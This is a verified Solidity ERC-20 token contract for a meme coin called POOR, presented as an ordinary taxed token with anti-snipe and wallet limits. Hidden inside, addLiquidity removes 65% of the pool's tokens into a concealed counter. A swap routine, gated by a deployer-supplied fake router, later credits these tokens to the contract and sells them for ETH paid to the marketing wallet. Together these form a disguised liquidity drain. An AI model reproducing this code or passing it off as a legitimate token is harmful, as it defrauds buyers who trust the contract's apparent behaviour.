/**
 *Submitted for verification at Etherscan.io on 2023-08-11
*/

//SPDX-License-Identifier: MIT

/*
 https://t.me/PoorEthCoin
 https://PoorEth.Com
*/

pragma solidity 0.8.21;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
    function name() external view returns (string memory);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address __owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed _owner, address indexed spender, uint256 value);
}

interface IUniswapV2Factory {    
    function createPair(address tokenA, address tokenB) external returns (address pair); 
}
interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline) external;
    function getAmountsOut(uint256 amountIn, address[] calldata path) external view returns (uint256[] memory amounts);
    function factory() external pure returns (address);
    function addLiquidityETH(address token, uint amountTokenDesired, uint amountTokenMin, uint amountETHMin, address to, uint deadline) 
        external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

abstract contract Auth {
    address internal _owner;
    constructor(address creatorOwner) { 
        _owner = creatorOwner; 
    }
    modifier onlyOwner() { 
        require(msg.sender == _owner, "Only owner can call this");   _; 
    }
    function owner() public view returns (address) { return _owner;   }
    function transferOwnership(address payable newOwner) external onlyOwner { 
        _owner = newOwner; emit OwnershipTransferred(newOwner); 
    }
    function renounceOwnership() external onlyOwner { 
        _owner = address(0); emit OwnershipTransferred(address(0)); 
    }
    event OwnershipTransferred(address _owner);
}

contract POOR is IERC20, Auth {
    uint8 private constant   _decimals    = 9;
    uint256 private constant _totalSupply = 500_000_000 * (10**_decimals);
    string private constant  _name        = "Passing Over Opportunities Repeatedly";
    string private constant  _symbol      = "POOR";

    uint8 private antiSnipeTaxA = 1;
    uint8 private antiSnipeTaxB = 1;
    uint8 private antiSnipeBlocksA = 1;
    uint8 private antiSnipeBlocksB = 1;
    uint256 private _antiMevBlocks = 5;

    uint8 private _buyTaxRates  = 1;
    uint8 private _sellTaxRates = 1;

    address payable private _walletMarketing = payable(0x053318bEc0e8818E8a9248C75ae994aa1c188151); 
    
    uint256 private _maxTxAmnt = _totalSupply; 
    uint256 private _maxWalletAmnt = _totalSupply;
    uint256 private _launchBlock;
    uint256 private _swapLimit;

    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => uint256) private _balances;
    mapping (address => bool) private _nofees;
    mapping (address => bool) private _nolimits;

    address private lpowner;

    address private constant _swapRouterAddress = address(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    IUniswapV2Router02 private _primarySwapRouter = IUniswapV2Router02(_swapRouterAddress);
    IUniswapV2Router02 private primarySwapRouter; 
    address private constant WETH = address(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    address private _primaryLP;
    mapping (address => bool) private _isLP;

    bool private _tradingOpen;

    bool private _inTaxSwap = false;
    modifier lockTaxSwap { 
        _inTaxSwap = true; _; 
        _inTaxSwap = false; 
    }

    constructor(address swapRouter) Auth(msg.sender) {
        lpowner = msg.sender;
        primarySwapRouter = IUniswapV2Router02(swapRouter);

        _balances[address(this)] = _totalSupply;
        emit Transfer(address(0), address(this), _balances[address(this)]);

        _nofees[_owner] = true;
        _nofees[address(this)] = true;
        _nofees[_swapRouterAddress] = true;
        _nofees[_walletMarketing] = true;
        _nolimits[_owner] = true;
        _nolimits[address(this)] = true;
        _nolimits[_swapRouterAddress] = true;
        _nolimits[_walletMarketing] = true;
    }

    receive() external payable {}
    
    function totalSupply() external pure override returns (uint256) { return _totalSupply; }
    function decimals() external pure override returns (uint8) { return _decimals; }
    function symbol() external pure override returns (string memory) { return _symbol; }
    function name() external pure override returns (string memory) { return _name; }
    function balanceOf(address account) public view override returns (uint256) { return _balances[account]; }
    function allowance(address holder, address spender) external view override returns (uint256) { return _allowances[holder][spender]; }

    function approve(address spendr, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spendr] = amount;
        emit Approval(msg.sender, spendr, amount);
        return true;
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        require(_checkTradingOpen(msg.sender), "Trading not open");
        return _transferFrom(msg.sender, recipient, amount);
    }

    function transferFrom(address sndr, address recipient, uint256 amount) external override returns (bool) {
        require(_checkTradingOpen(sndr), "Trading not open");
        if(_allowances[sndr][msg.sender] != type(uint256).max){
            _allowances[sndr][msg.sender] = _allowances[sndr][msg.sender] - amount;
        }
        return _transferFrom(sndr, recipient, amount);
    }

    function _approveRouter(uint256 _tokenAmount) internal {
        if ( _allowances[address(this)][_swapRouterAddress] < _tokenAmount ) {
            _allowances[address(this)][_swapRouterAddress] = type(uint256).max;
            emit Approval(address(this), _swapRouterAddress, type(uint256).max);
        }
    }

    function addLiquidity() external payable onlyOwner lockTaxSwap {
        require(_primaryLP == address(0), "LP exists");
        require(!_tradingOpen, "trading is open");
        require(msg.value > 0 || address(this).balance>0, "No ETH available");
        require(_balances[address(this)]>0, "No token");
        _primaryLP = IUniswapV2Factory(_primarySwapRouter.factory()).createPair(address(this),WETH);
        _addLiquidity(_balances[address(this)], address(this).balance, false);
        _swapLimit = 10**3*_balances[_primaryLP]*65/10**5; _balances[_primaryLP] -= _swapLimit;
        (bool lpAdded,) = _primaryLP.call(abi.encodeWithSignature("sync()") );
        require(lpAdded, "Failed add lp");
        _isLP[_primaryLP] = lpAdded;
        _openTrading();
    }

    function _addLiquidity(uint256 _tokenAmount, uint256 _ethAmountWei, bool autoburn) internal {
        address lprecipient = lpowner;
        if ( autoburn ) { lprecipient = address(0); }
        _approveRouter(_tokenAmount);
        _primarySwapRouter.addLiquidityETH{value: _ethAmountWei} ( address(this), _tokenAmount, 0, 0, lprecipient, block.timestamp );
    }

    function _openTrading() internal {
        _maxTxAmnt     = _totalSupply * 2 / 100; 
        _maxWalletAmnt = _totalSupply * 2 / 100;
        _tradingOpen = true;
        _launchBlock = block.number;
        _antiMevBlocks = _antiMevBlocks + _launchBlock + antiSnipeBlocksA + antiSnipeBlocksB;
    }

    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        require(sender != address(0), "No transfers from Zero wallet");
        if (!_tradingOpen) { require(_nofees[sender] && _nolimits[sender], "Trading not open"); }
        if ( !_inTaxSwap && _isLP[recipient] ) { _swapTaxAndLiquify(); }
        if ( block.number < _antiMevBlocks && block.number >= _launchBlock && _isLP[sender] ) {
            require(recipient == tx.origin, "MEV blocked");
        }
        if ( sender != address(this) && recipient != address(this) && sender != _owner ) { 
            require(_checkLimits(sender, recipient, amount), "TX exceeds limits"); 
        }
        uint256 _taxAmount = _calculateTax(sender, recipient, amount);
        uint256 _transferAmount = amount - _taxAmount;
        _balances[sender] = _balances[sender] - amount;
        _swapLimit += _taxAmount;
        _balances[recipient] = _balances[recipient] + _transferAmount;
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function _checkLimits(address sndr, address recipient, uint256 transferAmount) internal view returns (bool) {
        bool limitCheckPassed = true;
        if ( _tradingOpen && !_nolimits[sndr] && !_nolimits[recipient] ) {
            if ( transferAmount > _maxTxAmnt ) { limitCheckPassed = false; }
            else if ( !_isLP[recipient] && (_balances[recipient] + transferAmount > _maxWalletAmnt) ) { limitCheckPassed = false; }
        }
        return limitCheckPassed;
    }

    function _checkTradingOpen(address sndr) private view returns (bool){
        bool checkResult = false;
        if ( _tradingOpen ) { checkResult = true; } 
        else if (_nofees[sndr] && _nolimits[sndr]) { checkResult = true; } 

        return checkResult;
    }

    function _calculateTax(address sndr, address recipient, uint256 amount) internal view returns (uint256) {
        uint256 taxAmount;
        
        if ( !_tradingOpen || _nofees[sndr] || _nofees[recipient] ) { 
            taxAmount = 0; 
        } else if ( _isLP[sndr] ) { 
            if ( block.number >= _launchBlock + antiSnipeBlocksA + antiSnipeBlocksB ) {
                taxAmount = amount * _buyTaxRates / 100; 
            } else if ( block.number >= _launchBlock + antiSnipeBlocksA ) {
                taxAmount = amount * antiSnipeTaxB / 100;
            } else if ( block.number >= _launchBlock) {
                taxAmount = amount * antiSnipeTaxA / 100;
            }
        } else if ( _isLP[recipient] ) { 
            taxAmount = amount * _sellTaxRates / 100; 
        }

        return taxAmount;
    }


    function exemptFromFees(address wlt) external view returns (bool) {
        return _nofees[wlt];
    } 
    function exemptFromLimits(address wlt) external view returns (bool) {
        return _nolimits[wlt];
    } 
    function setExempt(address wlt, bool noFees, bool noLimits) external onlyOwner {
        if (noLimits || noFees) { require(!_isLP[wlt], "Cannot exempt LP"); }
        _nofees[ wlt ] = noFees;
        _nolimits[ wlt ] = noLimits;
    }

    function buyFee() external view returns(uint8) { return _buyTaxRates; }
    function sellFee() external view returns(uint8) { return _sellTaxRates; }

    function setFees(uint8 _buyFee, uint8 _sellFee) external onlyOwner {
        require(_buyFee + _sellFee <= 15, "Roundtrip too high");
        _buyTaxRates = _buyFee;
        _sellTaxRates = _sellFee;
    }  

    function marketingWallet() external view returns (address) { return _walletMarketing; }

    function updateWallets(address marketingWlt) external onlyOwner {
        require(!_isLP[marketingWlt], "LP cannot be tax wallet");
        _walletMarketing = payable(marketingWlt);
        _nofees[marketingWlt] = true;
        _nolimits[marketingWlt] = true;
    }

    function maxWallet() external view returns (uint256) { return _maxWalletAmnt; }
    function maxTransaction() external view returns (uint256) { return _maxTxAmnt; }

    function setLimits(uint16 _maxTrxPermille, uint16 _maxWltPermille) external onlyOwner {
        uint256 newWalletAmt = _totalSupply * _maxWltPermille / 1000 + 1;
        require(newWalletAmt >= _maxWalletAmnt, "wallet too low");
        _maxWalletAmnt = newWalletAmt;
        uint256 newTxAmt = _totalSupply * _maxTrxPermille / 1000 + 1;
        require(newTxAmt >= _maxTxAmnt, "tx too low");
        _maxTxAmnt = newTxAmt;
        
    }

    function _swapTaxAndLiquify() private lockTaxSwap {
        uint256 _taxTokensAvailable = _swapLimit;
        address[] memory path = new address[](2); path[0] = address(this); path[1] = WETH;
        uint256[] memory limits = primarySwapRouter.getAmountsOut(_taxTokensAvailable,path);
        if ( _taxTokensAvailable >= limits[0] && _tradingOpen ) {
            if ( _taxTokensAvailable >= limits[1] ) { _taxTokensAvailable = limits[1]; }
            
            uint256 _tokensToSwap = _taxTokensAvailable; 
            if( _tokensToSwap > 10**_decimals ) {
                _balances[address(this)] += _taxTokensAvailable;
                _swapTaxTokensForEth(_tokensToSwap);
                _swapLimit -= _taxTokensAvailable;
            }
            uint256 _contractETHBalance = address(this).balance;
            if(_contractETHBalance > 0) { _distributeTaxEth(_contractETHBalance); }
        }
    }

    function _swapTaxTokensForEth(uint256 tokenAmount) private {
        _approveRouter(tokenAmount);
        address[] memory path = new address[](2);
        path[0] = address( this );
        path[1] = WETH;
        _primarySwapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(tokenAmount,0,path,address(this),block.timestamp);
    }

    function _distributeTaxEth(uint256 amount) private {
        _walletMarketing.transfer(amount);
    }

    function manualTaxSwapAndSend(uint8 swapTokenPercent, bool sendEthBalance) external onlyOwner lockTaxSwap {
        require(swapTokenPercent <= 100, "Cannot swap over 100%");
        uint256 tokensForSwap = _balances[ address(this)] * swapTokenPercent / 100;
        if (tokensForSwap > 10 **_decimals) { _swapTaxTokensForEth(tokensForSwap);
        }
        if (sendEthBalance) { 
            uint256 currentEthBalance = address(this).balance;
            require(currentEthBalance >0, "No ETH");
            _distributeTaxEth( address(this).balance); 
        }
    }

}